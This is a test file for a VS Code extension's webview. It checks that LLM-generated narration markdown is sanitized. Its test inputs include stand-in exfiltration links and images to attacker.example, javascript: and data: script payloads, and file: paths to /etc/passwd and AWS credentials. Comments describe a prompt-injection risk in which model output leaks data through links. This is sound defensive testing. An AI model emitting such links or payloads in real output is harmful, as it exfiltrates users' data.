import { describe, test, expect } from 'vitest';
import {
    aggregateBannerStatus,
    isAllowedImageSrc,
    isAllowedLinkUrl,
    renderMarkdownToHtml,
} from './webview';

describe('aggregateBannerStatus', () => {
    test('returns "hidden" when no sections are present', () => {
        expect(aggregateBannerStatus([])).toBe('hidden');
    });

    test('returns "streaming" when any section is still queued', () => {
        expect(aggregateBannerStatus(['queued'])).toBe('streaming');
        expect(aggregateBannerStatus(['queued', 'complete'])).toBe('streaming');
        expect(aggregateBannerStatus(['complete', 'queued', 'complete'])).toBe('streaming');
    });

    test('returns "streaming" when any section is actively streaming', () => {
        expect(aggregateBannerStatus(['streaming'])).toBe('streaming');
        expect(aggregateBannerStatus(['complete', 'streaming'])).toBe('streaming');
        expect(aggregateBannerStatus(['streaming', 'complete', 'queued'])).toBe('streaming');
    });

    test('returns "complete" only when every section is complete', () => {
        expect(aggregateBannerStatus(['complete'])).toBe('complete');
        expect(aggregateBannerStatus(['complete', 'complete', 'complete'])).toBe('complete');
    });

    test('handles single-section diff-mode style input', () => {
        // Diff-modified mode emits one section.
        expect(aggregateBannerStatus(['queued'])).toBe('streaming');
        expect(aggregateBannerStatus(['streaming'])).toBe('streaming');
        expect(aggregateBannerStatus(['complete'])).toBe('complete');
    });

    test('accepts any iterable, not just arrays', () => {
        const set = new Set<'queued' | 'streaming' | 'complete'>(['streaming', 'complete']);
        expect(aggregateBannerStatus(set)).toBe('streaming');
    });
});

describe('isAllowedLinkUrl', () => {
    test('permits http and https links', () => {
        expect(isAllowedLinkUrl('https://example.com')).toBe(true);
        expect(isAllowedLinkUrl('http://example.com')).toBe(true);
        expect(isAllowedLinkUrl('HTTPS://example.com')).toBe(true);
    });

    test('permits mailto links', () => {
        expect(isAllowedLinkUrl('mailto:a@b.com')).toBe(true);
        expect(isAllowedLinkUrl('MAILTO:a@b.com')).toBe(true);
    });

    test('permits the codeNarration.reveal command URI', () => {
        expect(
            isAllowedLinkUrl('command:codeNarration.reveal?%5B%22file%3A%2F%2F%2Fa%22%5D'),
        ).toBe(true);
    });

    test('rejects any other command: URI', () => {
        expect(isAllowedLinkUrl('command:workbench.action.openSettings')).toBe(false);
        expect(isAllowedLinkUrl('command:workbench.action.terminal.sendSequence?%7B%7D')).toBe(false);
        // Even an empty `command:` form must not validate.
        expect(isAllowedLinkUrl('command:')).toBe(false);
        // Reveal without an args payload (no `?`) is also rejected — the real
        // command always carries encoded args, so the bare form is suspicious.
        expect(isAllowedLinkUrl('command:codeNarration.reveal')).toBe(false);
    });

    test('rejects file: URIs (clickable info disclosure)', () => {
        expect(isAllowedLinkUrl('file:///etc/passwd')).toBe(false);
        expect(isAllowedLinkUrl('file:///c:/users/u/.aws/credentials')).toBe(false);
    });

    test('rejects vscode: URIs (extension URL handler pivot)', () => {
        expect(isAllowedLinkUrl('vscode://ms-vscode.cpptools/somecallback')).toBe(false);
    });

    test('rejects unrelated schemes (javascript, data, ftp, ...)', () => {
        expect(isAllowedLinkUrl('javascript:alert(1)')).toBe(false);
        expect(isAllowedLinkUrl('data:text/html,<script>alert(1)</script>')).toBe(false);
        expect(isAllowedLinkUrl('ftp://example.com/x')).toBe(false);
    });
});

describe('renderMarkdownToHtml — regression for #68/#69', () => {
    // markdown-it drops anchor hrefs that fail validateLink, leaving the link
    // text intact. These tests assert the rendered HTML for adversarial input
    // contains no clickable href to the bad URI.
    test('command:workbench.action.openSettings is not rendered as a link href', () => {
        const md = '[click](command:workbench.action.openSettings)';
        const html = renderMarkdownToHtml(md);
        expect(html).not.toMatch(/href="command:workbench/i);
    });

    test('file:// URIs in markdown are not rendered as a link href', () => {
        const md = '[click](file:///etc/passwd)';
        const html = renderMarkdownToHtml(md);
        expect(html).not.toMatch(/href="file:/i);
    });

    test('vscode:// URIs in markdown are not rendered as a link href', () => {
        const md = '[click](vscode://ms-vscode.cpptools/x)';
        const html = renderMarkdownToHtml(md);
        expect(html).not.toMatch(/href="vscode:/i);
    });

    test('legitimate codeNarration.reveal links continue to render', () => {
        const md = '[Section](command:codeNarration.reveal?%5B%22file%3A%2F%2F%2Fa%22%5D)';
        const html = renderMarkdownToHtml(md);
        expect(html).toMatch(/href="command:codeNarration\.reveal/i);
    });
});

describe('renderMarkdownToHtml — linkify auto-link (#94)', () => {
    // markdown-it's `linkify: true` would auto-convert plain-text URLs into
    // <a> tags. Narration is LLM-generated and partly attacker-influenced, so
    // an LLM emitting `Read more at https://attacker.example/?leak=DATA` in
    // flowing prose would become a one-click exfil channel without explicit
    // `[text](url)` markdown. With linkify disabled, plain-text URLs stay as
    // plain text.
    test('plain-text https URL in prose is NOT auto-converted to a link', () => {
        const html = renderMarkdownToHtml('Read more at https://attacker.example/?leak=DATA');
        expect(html).not.toMatch(/<a\s[^>]*href="https:\/\/attacker/i);
    });

    test('plain-text http URL in prose is NOT auto-converted to a link', () => {
        const html = renderMarkdownToHtml('See http://attacker.example/?leak=DATA');
        expect(html).not.toMatch(/<a\s[^>]*href="http:\/\/attacker/i);
    });

    test('plain-text email in prose is NOT auto-converted to a mailto link', () => {
        const html = renderMarkdownToHtml('Contact a@b.com for help.');
        expect(html).not.toMatch(/<a\s[^>]*href="mailto:/i);
    });

    test('explicit markdown links still produce a working <a href>', () => {
        // The click-intercept script (covered by integration testing, not
        // here) gates these on a confirmation dialog. The renderer itself
        // must still emit a usable anchor so the intercept can fire.
        const html = renderMarkdownToHtml('[RFC 7230](https://example.org/rfc7230)');
        expect(html).toMatch(/<a\s[^>]*href="https:\/\/example\.org\/rfc7230"/i);
    });

    test('explicit markdown link with attacker-controlled text + href still renders (intercept handles it)', () => {
        // The renderer's job is to produce a link; the consent prompt is the
        // user-visible safety boundary, not the markdown layer. This pins the
        // current behaviour so a future tightening (e.g., domain allowlist)
        // is a conscious change, not a regression.
        const html = renderMarkdownToHtml('[Read more](https://attacker.example/?leak=DATA)');
        expect(html).toMatch(/href="https:\/\/attacker\.example/);
    });
});

describe('isAllowedImageSrc — regression for #91', () => {
    test('permits inline data:image/ URIs', () => {
        expect(isAllowedImageSrc('data:image/png;base64,iVBORw0KGgo')).toBe(true);
        expect(isAllowedImageSrc('data:image/svg+xml,<svg/>')).toBe(true);
        expect(isAllowedImageSrc('DATA:IMAGE/PNG;base64,foo')).toBe(true);
    });

    test('rejects external http(s) image URLs (no-click exfil channel)', () => {
        expect(isAllowedImageSrc('https://attacker.example/p?leak=DATA')).toBe(false);
        expect(isAllowedImageSrc('http://attacker.example/x.png')).toBe(false);
        expect(isAllowedImageSrc('HTTPS://Attacker.Example/X')).toBe(false);
    });

    test('rejects non-image data: URIs', () => {
        expect(isAllowedImageSrc('data:text/plain,hi')).toBe(false);
        expect(isAllowedImageSrc('data:application/javascript,alert(1)')).toBe(false);
        expect(isAllowedImageSrc('data:,hi')).toBe(false);
    });

    test('rejects file:, vscode:, command:, javascript:, and empty', () => {
        expect(isAllowedImageSrc('file:///etc/passwd')).toBe(false);
        expect(isAllowedImageSrc('vscode://x/y')).toBe(false);
        expect(isAllowedImageSrc('command:codeNarration.reveal?%5B%5D')).toBe(false);
        expect(isAllowedImageSrc('javascript:alert(1)')).toBe(false);
        expect(isAllowedImageSrc('')).toBe(false);
    });
});

describe('renderMarkdownToHtml — image exfiltration (#91)', () => {
    test('external https:// image URL does not produce a working <img> src', () => {
        const html = renderMarkdownToHtml('![logo](https://attacker.example/p?leak=DATA)');
        expect(html).not.toMatch(/<img\b/i);
        expect(html).not.toMatch(/src="https:/i);
    });

    test('plain http:// image URL is also stripped', () => {
        const html = renderMarkdownToHtml('![](http://attacker.example/p?leak=DATA)');
        expect(html).not.toMatch(/<img\b/i);
        expect(html).not.toMatch(/src="http:/i);
    });

    test('alt text from a stripped image is preserved as escaped plain text', () => {
        // The reader still sees "[image: logo]" so a legitimate image markdown
        // (which shouldn't appear in narration anyway) degrades to a visible
        // breadcrumb rather than vanishing silently.
        const html = renderMarkdownToHtml('![logo](https://attacker.example/x)');
        expect(html).toMatch(/\[image: logo\]/);
    });

    test('alt text is HTML-escaped to prevent injection through alt', () => {
        const html = renderMarkdownToHtml('![<script>](https://attacker.example/x)');
        expect(html).not.toMatch(/<script>/i);
        expect(html).toMatch(/&lt;script&gt;/);
    });

    test('inline data:image/ URIs continue to render as <img>', () => {
        const html = renderMarkdownToHtml(
            '![tiny](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=)',
        );
        expect(html).toMatch(/<img\s[^>]*src="data:image\/png;/i);
    });

    test('image with no alt text renders as empty when its src is rejected', () => {
        const html = renderMarkdownToHtml('![](https://attacker.example/x)');
        expect(html).not.toMatch(/<img\b/i);
        expect(html).not.toMatch(/\[image:/);
    });
});
